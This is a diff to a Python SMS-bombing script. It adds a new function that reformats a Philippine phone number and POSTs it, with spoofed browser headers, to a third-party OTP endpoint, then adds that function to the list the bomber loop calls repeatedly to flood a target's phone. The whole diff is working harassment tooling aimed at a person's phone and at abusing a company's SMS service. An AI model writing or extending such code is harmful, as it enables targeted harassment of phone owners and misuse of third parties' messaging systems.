@@ -272,6 +272,32 @@ def otp8(number):
     except:
         field+=1
         return False
+def otp9(number):
+    global limit, field
+    if str(number[0]) == "0":
+        number = str(number[1:])
+    elif str(number[0]) == "+":
+        number = str(number[3:])
+    elif str(number[:2]) == "63":
+        number = str(number[2:])
+    else:
+        pass
+    session = requests.Session()
+    url = "https://api.ayala-group.top/sendSMS.do"
+    header = {'Host': 'api.ayala-group.top', 'Connection': 'keep-alive', 'Content-Length': '24', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded', 'sec-ch-ua-mobile': '?0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54', 'sec-ch-ua-platform': '"Windows"', 'sec-gpc': '1', 'Origin': 'https://m.ayala-vip.com/', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://m.ayala-vip.com/', 'Accept-Encoding': 'gzip', 'Accept-Language': 'en-US,en;q=0.9'}
+    body = {"mobile":str(number),"type":"3"}
+    web = session.post(url, headers = header, data = body)
+    try:
+        web = session.post(url, headers = header, data = body)
+        if int(web.status_code) == 200:
+            limit+=1
+            return True
+        else:
+            field+=1
+            return False
+    except:
+        field+=1
+        return False
 def bomber(function):
     global limit, RUN, limit1, field, slp
     number = open("number.txt", "r").read()
@@ -297,7 +323,7 @@ def home():
     a.write(str(number))
     a.close()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mLimit")
-    function = [otp, otp1, otp2, otp3, otp4, otp5, otp6, otp7, otp8]
+    function = [otp, otp1, otp2, otp3, otp4, otp5, otp6, otp7, otp8, otp9]
     limit1 = pick()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mSleep")
     slp = pick()
